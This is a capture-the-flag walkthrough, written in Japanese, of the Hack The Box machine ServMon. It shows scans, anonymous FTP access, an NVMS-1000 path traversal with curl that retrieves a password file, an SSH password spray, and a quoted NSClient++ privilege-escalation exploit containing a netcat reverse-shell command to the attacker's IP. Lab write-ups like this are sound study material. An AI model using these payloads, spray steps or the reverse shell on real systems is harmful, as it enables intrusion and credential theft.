https://app.hackthebox.com/machines/240

## STEP 1
```sh
└─$ rustscan -a 10.129.61.85 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.61.85:21
Open 10.129.61.85:22
Open 10.129.61.85:80
Open 10.129.61.85:139
Open 10.129.61.85:135
Open 10.129.61.85:445
Open 10.129.61.85:5666
Open 10.129.61.85:6063
Open 10.129.61.85:6699
Open 10.129.61.85:8443
Open 10.129.61.85:49669
Open 10.129.61.85:49664
Open 10.129.61.85:49665
Open 10.129.61.85:49668
Open 10.129.61.85:49666
Open 10.129.61.85:49667
Open 10.129.61.85:49670
10.129.61.85 -> [21,22,80,139,135,445,5666,6063,6699,8443,49669,49664,49665,49668,49666,49667,49670]
```
```sh
└─$ nmap -n -Pn -p 21,22,80,139,135,445,5666,6063,6699,8443 -sV 10.129.61.85
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 06:27 EST
Nmap scan report for 10.129.61.85
Host is up (0.72s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
80/tcp   open  http
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6063/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=11/4%Time=6909E316%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=11/4%Time=6909E323%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\xb8M\xbb\xba\0\0\0\0\xb8\
SF:xd5\xe4y9Z\xf4\x05\xf6}`\0s\0d\0a\0y\0:\0T\0h\0u\0:\0T\0h\0u\0r\0s\0")%
SF:r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocu
SF:ment\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nCont
SF:ent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"H
SF:TTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20foun
SF:d")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nD
SF:ocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.08 seconds
```


## STEP 2
ftpはanonymousログインが可能であった  
ftp内にテキストファイルを発見、Confidential.txtからnadineのデスクトップ上にPasswords.txtが保存されていることを確認
```sh
└─$ tnftp -a 10.129.61.85
Connected to 10.129.61.85.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.

ftp> binary 
200 Type set to I.

ftp> dir
229 Entering Extended Passive Mode (|||49703|)
125 Data connection already open; Transfer starting.
02-28-22  06:35PM       <DIR>          Users
226 Transfer complete.

ftp> dir Users
229 Entering Extended Passive Mode (|||49705|)
125 Data connection already open; Transfer starting.
02-28-22  06:36PM       <DIR>          Nadine
02-28-22  06:37PM       <DIR>          Nathan
226 Transfer complete.

ftp> more Users/Nadine/Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

ftp> more Users/Nathan/Notes\ to\ do.txt
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
80番にアクセス  
nvms-1000が動作していることを確認  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_01.png">  
nvms10000にはlfiの脆弱性が存在していることを確認、PoCも発見  
```sh
└─$ searchsploit -m 47774
  Exploit: NVMS 1000 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/47774
     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
    Codes: N/A
 Verified: False
File Type: Unicode text, UTF-8 text
Copied to: /home/kali/47774.txt

└─$ cat 47774.txt       
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1 
```
PoC通りlfiができた
```sh
└─$ curl --path-as-is 'http://10.129.61.85/../../../../../../../../../../../../windows/win.ini'
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
lfiでnathanユーザのデスクトップ上のPasswords.txtを確認できた
```sh
└─$ curl -o passwords.txt --path-as-is -s 'http://10.129.61.85/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt' 

└─$ cat passwords.txt                                                                                                                 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$ 
```
取得したパスワードリストで、nadineにsshログイン成功
```sh
└─$ netexec ssh 10.129.61.85 -u nadine -p passwords.txt
SSH         10.129.61.85    22     10.129.61.85     [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.61.85    22     10.129.61.85     [-] nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.61.85    22     10.129.61.85     [-] nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.61.85    22     10.129.61.85     [-] nadine:B3WithM30r4ga1n5tMe
SSH         10.129.61.85    22     10.129.61.85     [+] nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
```
ということでユーザフラグゲット
```sh
└─$ ssh nadine@10.129.61.85
nadine@10.129.61.85's password: 
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.                       
                                                            
nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt 
2e23cbdba45c91ebcaeb5316e82243d4
```


## STEP 3
8443番にhttpsアクセス  
nsclient++が動作しているっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_02.png">  
実際にnsclient++がインストールされていることを確認
```powershell
nadine@SERVMON C:\Users\Nadine>dir "c:\Program Files"
 Volume in drive C has no label.                                                   
 Volume Serial Number is 20C1-47A1                                                 
                                                                                   
 Directory of c:\Program Files                                                     
                                                                                   
02/28/2022  06:55 PM    <DIR>          .                                           
02/28/2022  06:55 PM    <DIR>          ..                                          
03/01/2022  01:20 AM    <DIR>          Common Files                                
11/11/2019  06:52 PM    <DIR>          internet explorer                           
02/28/2022  06:07 PM    <DIR>          MSBuild                                     
02/28/2022  06:55 PM    <DIR>          NSClient++                                  
02/28/2022  06:46 PM    <DIR>          NVMS-1000                                   
02/28/2022  06:32 PM    <DIR>          OpenSSH-Win64                               
02/28/2022  06:07 PM    <DIR>          Reference Assemblies                        
02/28/2022  05:44 PM    <DIR>          VMware                                      
11/11/2019  06:52 PM    <DIR>          Windows Defender                            
11/11/2019  06:52 PM    <DIR>          Windows Defender Advanced Threat Protection 
09/14/2018  11:19 PM    <DIR>          Windows Mail                                
11/11/2019  06:52 PM    <DIR>          Windows Media Player                        
09/14/2018  11:19 PM    <DIR>          Windows Multimedia Platform                 
09/14/2018  11:28 PM    <DIR>          windows nt                                  
11/11/2019  06:52 PM    <DIR>          Windows Photo Viewer                        
09/14/2018  11:19 PM    <DIR>          Windows Portable Devices                    
09/14/2018  11:19 PM    <DIR>          Windows Security                            
02/28/2022  06:25 PM    <DIR>          WindowsPowerShell                           
               0 File(s)              0 bytes                                      
              20 Dir(s)   6,112,477,184 bytes free
```
nsclientには権限昇格のテクニックがあるらしい  
ようは管理者権限で動作しているweb経由で攻撃者のプログラムを実行させるイメージ  
ただマシンがくそ重いので断念、なんかapi経由だと楽にエクスプロイトできるらしいけど
```sh
└─$ searchsploit -m 46802
  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46802
     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (466)
Copied to: /home/kali/46802.txt

└─$ cat 46802.txt    
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
        C:\Program Files\NSClient++>nscp web -- password --display
        Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
        @echo off
        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
        nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
        - foobar
                command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
        - foobar
                interval = 1m
                command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
        nc -nlvvp 443
        listening on [any] 443 ...
        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
        Microsoft Windows [Version 10.0.17134.753]
        (c) 2018 Microsoft Corporation. All rights reserved.

        C:\Program Files\NSClient++>whoami
        whoami
        nt authority\system

Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
```
